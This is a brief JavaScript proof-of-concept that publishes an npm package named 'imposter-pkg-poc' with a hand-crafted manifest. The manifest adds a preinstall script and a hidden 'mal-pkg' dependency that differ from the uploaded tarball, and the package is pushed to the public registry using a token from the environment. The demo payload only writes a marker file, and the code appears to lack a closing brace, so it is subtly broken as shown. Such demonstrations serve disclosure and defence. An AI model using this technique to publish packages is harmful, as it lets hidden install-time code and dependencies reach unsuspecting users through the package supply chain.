;(async () => {
  // libs
  const ssri = require('ssri')
  const pack = require('libnpmpack')
  const fetch = require('npm-registry-fetch')

  // pack tarball & generate ingetrity
  const tarball = await pack('./pkg/')
  const integrity = ssri.fromData(tarball, {
    algorithms: [...new Set(['sha1', 'sha512'])],
  })

  // craft manifest
  const name = 'imposter-pkg-poc'
  const version = '1.0.0'
  const manifest = {
    _id: name,
    name: "imposter-pkg-poc",
    'dist-tags': {
      latest: version,
    },
    versions: {
      [version]: {
        _id: `${name}@${version}`,
        name,
        version,
        dist: {
          integrity: integrity.sha512[0].toString(),
          shasum: integrity.sha1[0].hexDigest(),
          tarball: '',
        },
        scripts: {"preinstall": "touch ../mal-pkg-write && echo \"bad payload written!\"\n" },
        dependencies: {"mal-pkg": "1.0.0"},
        author: "l33t h4x0r",
    },
    _attachments: {
      0: {
        content_type: 'application/octet-stream',
        data: tarball.toString('base64'),
        length: tarball.length,
      },
    },
  }

  // publish via PUT
  fetch(name, {
    '//registry.npmjs.org/:_authToken': process.env.NPM_PUBLISH_TOKEN,
    method: 'PUT',
    body: manifest,
  })
})()